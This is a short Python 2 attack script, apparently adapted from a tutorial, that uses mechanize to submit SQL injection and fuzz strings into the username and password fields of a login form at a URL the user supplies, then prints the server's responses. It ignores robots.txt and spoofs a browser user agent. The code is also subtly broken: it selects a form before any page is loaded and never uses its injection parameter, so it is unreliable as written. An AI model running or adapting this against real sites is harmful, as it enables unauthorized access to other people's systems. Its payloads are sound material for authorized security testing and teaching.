#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
#------------------------------------------------
# Source: https://sdet.us/form-fuzzing-python-mechanize/
import re
import mechanize
#browser = mechanize.Browser()
browser = mechanize.Browser(factory=mechanize.RobustFactory())
browser.set_handle_robots(False)
browser.set_handle_equiv(True)
browser.set_handle_gzip(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.select_form(nr=0)
ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36'
browser.addheaders = [('User-Agent', ua), ('Accept', '*/*')]
#---------------------------------------------------------------

url = input("Enter the full URL (https://127.0.0.1/login.php): ")
#------------------------------------------------------------------------------------------------------------------------------------

# SQL Injection and Fuzz Values:
badblood = ["'; or 1=1 a@gmail.com", "%5C%5C bill@gmail.com", "//jack@gmail.com","%20='"]

def formScrape(url):
    # Initial form finding:
    browser.open(url)
    for form in browser.forms():
        print form

def attackf(url, injection=badblood):

    for evil in badblood:
        print "Attempting attack with: " + evil
        try:
            browser.open(url)
            browser.select_form(nr=0)
            browser.form['j_username'] = evil
            browser.form['j_password'] = evil
            browser.submit()
            for line in browser.response():
                print line
        except:
            pass

#attackf('https://127.0.0.1/login')
attackf(url)
